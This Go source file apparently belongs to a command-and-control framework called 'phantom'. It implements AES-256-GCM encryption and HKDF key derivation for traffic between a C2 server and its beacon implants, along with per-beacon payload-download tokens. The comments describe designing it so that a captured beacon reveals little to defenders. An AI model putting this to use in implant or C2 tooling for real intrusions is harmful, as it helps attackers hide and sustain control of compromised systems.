// envelope.go — the body codec, byte-compatible with both sides.
//
// Python (`c2_crypto.encrypt_data`) and the beacon (`crypto::encrypt`) use:
//
//	base64( nonce[12] || ciphertext || tag[16] )
//
// with AES-256-GCM, a RANDOM 12-byte nonce per message and no AAD. Three
// implementations, one format: a drift here is invisible until a real beacon
// checks in and nothing decrypts.
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"errors"
)

const (
	nonceLen = 12
	tagLen   = 16
)

// HKDF domain separation, identical to phantom.utils.c2_crypto: a fixed salt
// (the IKM is already 256 bits of entropy) and an info string that picks the
// purpose, so envelope secrecy and payload-download authorisation are
// independent keys cut from one secret.
const (
	envelopeSalt = "phantom-envelope-v1"
	envelopeInfo = "phantom-envelope:"
	downloadInfo = "phantom-download:"
)

// ErrShortCiphertext is returned for a body too short to hold nonce + tag.
var ErrShortCiphertext = errors.New("ciphertext too short")

// Encrypt seals plaintext and returns the base64 wire string.
func Encrypt(key []byte, plaintext string) (string, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	sealed := gcm.Seal(nil, nonce, []byte(plaintext), nil)
	out := make([]byte, 0, len(nonce)+len(sealed))
	out = append(out, nonce...)
	out = append(out, sealed...)
	return base64.StdEncoding.EncodeToString(out), nil
}

// Decrypt opens a base64 wire string, or returns an error.
func Decrypt(key []byte, encoded string) (string, error) {
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}
	if len(raw) < nonceLen+tagLen {
		return "", ErrShortCiphertext
	}
	gcm, err := newGCM(key)
	if err != nil {
		return "", err
	}
	nonce, ct := raw[:gcm.NonceSize()], raw[gcm.NonceSize():]
	plain, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

// ── per-beacon key derivation ──────────────────────────────────────────

// DeriveKey is HKDF-SHA256 (RFC 5869 extract + a single expand block), byte
// for byte the same as phantom.utils.c2_crypto.derive_key and
// crypto::hkdf_sha256 in the beacon. A drift here is SILENT — the beacon just
// never decrypts — so the shared vectors are pinned on every side.
func DeriveKey(secret []byte, info string) []byte {
	if len(secret) == 0 {
		return nil
	}
	mac := hmac.New(sha256.New, []byte(envelopeSalt))
	mac.Write(secret)
	prk := mac.Sum(nil)
	mac = hmac.New(sha256.New, prk)
	mac.Write([]byte(info))
	mac.Write([]byte{0x01})
	return mac.Sum(nil)[:32]
}

// EnvelopeKey is the per-beacon AES-256-GCM key for one identity: a captured
// beacon exposes only its own traffic, never the deployment key.
func EnvelopeKey(secret []byte, beaconID string) []byte {
	return DeriveKey(secret, envelopeInfo+beaconID)
}

// DownloadToken is the per-beacon payload-download token (hex), replacing the
// deployment-wide C2_PAYLOAD_TOKEN that used to be burned into every binary.
func DownloadToken(secret []byte, beaconID string) string {
	derived := DeriveKey(secret, downloadInfo+beaconID)
	if derived == nil {
		return ""
	}
	return hex.EncodeToString(derived)
}

func newGCM(key []byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}
